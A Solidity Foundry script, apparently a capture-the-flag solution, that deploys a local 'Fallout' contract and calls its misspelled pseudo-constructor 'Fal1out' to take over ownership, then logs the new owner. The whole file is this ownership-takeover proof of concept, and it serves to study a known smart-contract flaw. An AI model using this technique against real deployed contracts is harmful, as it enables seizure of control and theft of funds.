// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import  "forge-std/Script.sol";
import "../src/Fallout.sol";

contract FalloutScript is Script {
    Fallout fl;
    function setUp() public{}

    function run() public {
        fl = new Fallout();
        
        vm.deal(address(0), 1 ether);
        vm.startPrank(address(0));

        fl.Fal1out();
        address ownerFallout = fl.owner();
        console.log("New owner Fal1out:", ownerFallout);

    }
}